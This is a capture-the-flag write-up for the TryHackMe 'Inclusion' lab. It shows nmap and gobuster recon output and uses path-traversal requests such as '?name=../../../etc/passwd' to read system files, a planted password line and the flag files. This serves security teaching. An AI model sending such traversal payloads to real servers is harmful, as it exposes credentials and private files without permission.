# Inclusion

This room is intended to focus on local file inclusion attacks, so my guess is that hitting the machine with nmap and gobuster is probably unnecessary. But, I'm going to do it anyway, just in case.

The target is 10.10.0.57. The website running there is basically a shell — most of the links, including the search box, don't work. No JavaScript is loaded. The only links that *do* work are the "View details" buttons underneath the bottom three articles. This call an `/articles` endpoint with a single parameter, `name`. The resulting page looks like someone just dumped a plain text file between the `<body/>` tags.

Given the purpose of the room, I'm going to guess they did.

While it's probably *pro forma*, let's run our usual nmap scan just in case:

```bash
sudo nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln \
          -p- 10.10.0.57
```

This gives the following output:

```
# Nmap 7.92 scan initiated Tue Feb  1 18:58:37 2022 as: nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln -p- 10.10.0.57
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.0.57
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.6.9: 
|     	CVE-2021-3177	7.5	https://vulners.com/cve/CVE-2021-3177
|     	CVE-2020-27619	7.5	https://vulners.com/cve/CVE-2020-27619
|     	CVE-2020-8492	7.1	https://vulners.com/cve/CVE-2020-8492
|     	CVE-2020-26116	6.4	https://vulners.com/cve/CVE-2020-26116
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/	*EXPLOIT*
|     	CVE-2019-9636	5.0	https://vulners.com/cve/CVE-2019-9636
|     	CVE-2019-16056	5.0	https://vulners.com/cve/CVE-2019-16056
|     	CVE-2018-20852	5.0	https://vulners.com/cve/CVE-2018-20852
|     	CVE-2018-20406	5.0	https://vulners.com/cve/CVE-2018-20406
|     	CVE-2018-1060	5.0	https://vulners.com/cve/CVE-2018-1060
|     	MSF:ILITIES/SUSE-CVE-2020-14422/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2020-14422/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/	4.3	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/	*EXPLOIT*
|     	CVE-2021-28359	4.3	https://vulners.com/cve/CVE-2021-28359
|     	CVE-2020-8315	4.3	https://vulners.com/cve/CVE-2020-8315
|     	CVE-2020-14422	4.3	https://vulners.com/cve/CVE-2020-14422
|     	CVE-2019-9947	4.3	https://vulners.com/cve/CVE-2019-9947
|     	CVE-2019-9740	4.3	https://vulners.com/cve/CVE-2019-9740
|     	CVE-2019-18348	4.3	https://vulners.com/cve/CVE-2019-18348
|     	CVE-2019-16935	4.3	https://vulners.com/cve/CVE-2019-16935
|     	CVE-2021-23336	4.0	https://vulners.com/cve/CVE-2021-23336
|     	MSF:ILITIES/DEBIAN-CVE-2021-3426/	2.7	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-3426/	*EXPLOIT*
|_    	CVE-2021-3426	2.7	https://vulners.com/cve/CVE-2021-3426
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/1%OT=22%CT=1%CU=40063%PV=Y%DS=4%DC=T%G=Y%TM=61F9EB2E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D
OS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 48.616 days (since Wed Dec 15 04:37:20 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   38.25 ms  10.13.0.1
2   ... 3
4   170.72 ms 10.10.0.57

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 19:23:42 2022 -- 1 IP address (1 host up) scanned in 1505.56 seconds
```

So, we've got a Linux box running SSH and some weird-ass httpd server on port 80.

We'll also hit 10.10.0.57 with gobuster:

```bash
gobuster \
	-t 50 dir \
	-u http://10.10.0.57 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

This only detects the `/article` endpoint I noted while poking around the site. (I could hit the site with a larger wordlist, but it doesn't seem worth it.)

I'm going to go out on a limb here and guess that we're going to exploit the `/article` endpoint, which probably *is* just pulling in files verbatim.

A common file on Linux systems is `/etc/os-release`, so let's see if we can include this. And, in fact, after a little experimentation it turns out that we can using `http://10.10.0.57/article?name=../../../etc/os-release`:

```bash
NAME="Ubuntu";
VERSION="18.04.3 LTS (Bionic Beaver)";
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS";
VERSION_ID="18.04";
HOME_URL="https://www.ubuntu.com/";
SUPPORT_URL="https://help.ubuntu.com/";
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/";
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy";
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

(It looks like `/article` must be doing some simple escaping too.)

Let's grab `/etc/passwd` so we know which users are running on the system.

```passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

I wonder who the current process is running as? `/proc/self/status` should have the answer.

```proc
Name:	flask
Umask:	0022
State:	S (sleeping)
Tgid:	567
Ngid:	0
Pid:	567
PPid:	1
TracerPid:	0
Uid:	0	0	0	0
Gid:	0	0	0	0
FDSize:	128
Groups:	 
NStgid:	567
NSpid:	567
NSpgid:	567
NSsid:	567
VmPeak:	  751740 kB
VmSize:	  669780 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	   35560 kB
VmRSS:	   35560 kB
RssAnon:	   25656 kB
RssFile:	    9904 kB
RssShmem:	       0 kB
VmData:	   74948 kB
VmStk:	     132 kB
VmExe:	    3792 kB
VmLib:	    8568 kB
VmPTE:	     292 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
CoreDumping:	0
Threads:	4
SigQ:	0/3686
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	0000000180000002
CapInh:	0000000000000000
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Speculation_Store_Bypass:	vulnerable
Cpus_allowed:	7fff
Cpus_allowed_list:	0-14
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	129378
nonvoluntary_ctxt_switches:	1378
```

Score! We're running as `root`. So we should be able to get our hands on anything.

Unfortunately, it looks like neither `falconfeast` nor `root` have SSH keys (I checked for `id_dsa`, `id_rsa`, and `id_id_ed25519`), so we're just going to have to blindly find the flags.

Fortunately, the names are pretty standard:

* `/home/falconfeast/user.txt` can be obtained using `http://10.10.0.57/article?name=../../../home/falconfeast/user.txt`.
* `/root/root.txt` can be obtained using `http://10.10.0.57/article?name=../../../root/root.txt`.

And with that, we're done.

* [LFI (Local File Inclusion) Attacks](../Notes/LFI%20%28Local%20File%20Inclusion%29%20Attacks.md)
* [Using "nmap"](../Notes/Using%20%22nmap%22.md)
* [Using "gobuster"](../Notes/Using%20%22gobuster%22.md)

ELAPSED TIME: 56 min

## References

* [TryHackMe: Inclusion](https://tryhackme.com/room/inclusion)
